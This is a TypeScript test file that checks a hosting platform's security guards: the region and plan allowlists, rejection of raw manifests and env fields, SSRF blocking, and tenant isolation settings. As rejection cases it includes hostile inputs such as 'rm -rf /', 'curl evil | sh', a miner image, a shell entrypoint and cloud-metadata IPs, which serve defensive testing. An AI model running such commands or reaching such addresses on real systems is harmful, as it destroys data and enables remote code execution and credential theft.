// W5 — Pure catalog + security-guard tests (mock / DB-free). These prove the
// Part 3.A controls that don't need a store:
//   * server-side ENUM allowlist REJECTS free-form region/plan/size,
//   * the no-raw-manifest/YAML/env guard REJECTS any smuggled build spec,
//   * the SSRF outbound allowlist blocks metadata / RFC1918 / link-local + IPv6,
//   * the max-scale ceiling is represented per plan (the guardrail's source).

import { describe, expect, it } from "vitest";
import {
  assertNoRawSpec,
  hostingCatalog,
  HOSTING_PLAN_NAMES,
  HOSTING_REGIONS,
  isHostingPlanName,
  isHostingRegion,
  planEstimateMicro,
  resolvePlacement,
} from "./catalog";
import { renderManifest } from "./manifest";
import { isHostingOutboundAllowed } from "./tier/router";

describe("W5 catalog — server-side enum allowlist (region/plan)", () => {
  it("accepts every catalog region + plan", () => {
    for (const region of HOSTING_REGIONS) {
      for (const plan of HOSTING_PLAN_NAMES) {
        const r = resolvePlacement(region, plan);
        expect(r.ok).toBe(true);
      }
    }
  });

  it("REJECTS a free-form region (never interpreted)", () => {
    expect(isHostingRegion("us-east-1")).toBe(false);
    expect(isHostingRegion("../../etc")).toBe(false);
    const r = resolvePlacement("us-east-1", "starter");
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.reason).toBe("bad_region");
  });

  it("REJECTS a free-form plan/size (never interpreted)", () => {
    expect(isHostingPlanName("16vcpu-64gb")).toBe(false);
    expect(isHostingPlanName("custom")).toBe(false);
    const r = resolvePlacement("us", "16vcpu-64gb");
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.reason).toBe("bad_plan");
  });

  it("rejects a non-string region/plan (object/array/number)", () => {
    expect(resolvePlacement({ region: "us" }, "starter").ok).toBe(false);
    expect(resolvePlacement("us", ["starter"]).ok).toBe(false);
    expect(resolvePlacement(1, 2).ok).toBe(false);
  });
});

describe("W5 catalog — NO raw manifest/YAML/Dockerfile/env from owners", () => {
  it("accepts a clean payload (only region/plan/slug)", () => {
    expect(assertNoRawSpec({ region: "us", planName: "scale", slug: "joes" }).ok).toBe(
      true,
    );
    expect(assertNoRawSpec(undefined).ok).toBe(true);
  });

  it("REJECTS a raw manifest / yaml / dockerfile", () => {
    expect(assertNoRawSpec({ manifest: "apiVersion: v1" }).ok).toBe(false);
    expect(assertNoRawSpec({ yaml: "kind: Pod" }).ok).toBe(false);
    expect(assertNoRawSpec({ dockerfile: "FROM alpine" }).ok).toBe(false);
    expect(assertNoRawSpec({ Dockerfile: "FROM alpine" }).ok).toBe(false); // case-insensitive
  });

  it("REJECTS a smuggled command / image / env (RCE vectors)", () => {
    expect(assertNoRawSpec({ command: "rm -rf /" }).ok).toBe(false);
    expect(assertNoRawSpec({ image: "evil/miner:latest" }).ok).toBe(false);
    expect(assertNoRawSpec({ env: { SECRET: "x" } }).ok).toBe(false);
    expect(assertNoRawSpec({ buildCommand: "curl evil | sh" }).ok).toBe(false);
    const bad = assertNoRawSpec({ entrypoint: "/bin/sh" });
    expect(bad.ok).toBe(false);
    if (!bad.ok) expect(bad.key).toBe("entrypoint");
  });
});

describe("W5 SSRF — outbound allowlist blocks metadata/RFC1918/link-local (+IPv6)", () => {
  it("blocks the cloud metadata IP, loopback, RFC1918, link-local (IPv4)", () => {
    expect(isHostingOutboundAllowed("169.254.169.254")).toBe(false); // metadata
    expect(isHostingOutboundAllowed("127.0.0.1")).toBe(false); // loopback
    expect(isHostingOutboundAllowed("10.0.0.5")).toBe(false); // RFC1918
    expect(isHostingOutboundAllowed("192.168.1.1")).toBe(false); // RFC1918
    expect(isHostingOutboundAllowed("172.16.0.1")).toBe(false); // RFC1918
  });

  it("blocks the IPv6 equivalents (loopback / link-local / unique-local / mapped)", () => {
    expect(isHostingOutboundAllowed("::1")).toBe(false);
    expect(isHostingOutboundAllowed("[::1]")).toBe(false);
    expect(isHostingOutboundAllowed("fe80::1")).toBe(false); // link-local
    expect(isHostingOutboundAllowed("fd00:ec2::254")).toBe(false); // IPv6 metadata
    expect(isHostingOutboundAllowed("[::ffff:169.254.169.254]")).toBe(false); // mapped
  });

  it("blocks reserved/internal names and anything not on the (empty) allowlist", () => {
    expect(isHostingOutboundAllowed("localhost")).toBe(false);
    expect(isHostingOutboundAllowed("api.machines.dev")).toBe(false); // not allowlisted
    expect(isHostingOutboundAllowed("")).toBe(false);
    expect(isHostingOutboundAllowed(null)).toBe(false);
  });

  it("permits a host only when explicitly allowlisted (env)", () => {
    process.env.HOSTING_OUTBOUND_ALLOWLIST = "api.machines.dev";
    try {
      expect(isHostingOutboundAllowed("api.machines.dev")).toBe(true);
      expect(isHostingOutboundAllowed("region.api.machines.dev")).toBe(true); // subdomain
      expect(isHostingOutboundAllowed("evil.com")).toBe(false);
      // Even allowlisted, an IP literal is never permitted.
      expect(isHostingOutboundAllowed("169.254.169.254")).toBe(false);
    } finally {
      delete process.env.HOSTING_OUTBOUND_ALLOWLIST;
    }
  });
});

describe("W5 catalog — plan ceilings + rendered isolation manifest", () => {
  it("every plan carries a hard max-scale ceiling >= its default replicas", () => {
    for (const plan of Object.values(hostingCatalog())) {
      expect(plan.maxReplicas).toBeGreaterThanOrEqual(plan.replicas);
      expect(plan.maxReplicas).toBeGreaterThan(0);
    }
  });

  it("renders the mandatory isolation controls into the manifest (no owner spec)", () => {
    const plan = hostingCatalog().scale;
    const m = renderManifest({ tenantId: "tenant-x", slug: "joes-shop", region: "eu", plan });
    expect(m.namespace.startsWith("ld-")).toBe(true); // namespace-per-tenant
    expect(m.serviceAccount).toContain(m.namespace); // scoped service account
    expect(m.podSecurity).toBe("restricted"); // PodSecurity restricted
    expect(m.networkPolicy.defaultDenyEgress).toBe(true); // default-deny egress
    expect(m.networkPolicy.egressAllowlist).toEqual([]); // no platform creds reachable
    expect(m.resourceQuota.maxPods).toBe(plan.maxReplicas); // ResourceQuota = ceiling
    expect(m.replicas).toBeLessThanOrEqual(plan.maxReplicas);
  });

  it("a plan's monthly estimate is a positive upper bound", () => {
    for (const plan of Object.values(hostingCatalog())) {
      expect(planEstimateMicro(plan) > 0n).toBe(true);
    }
  });
});
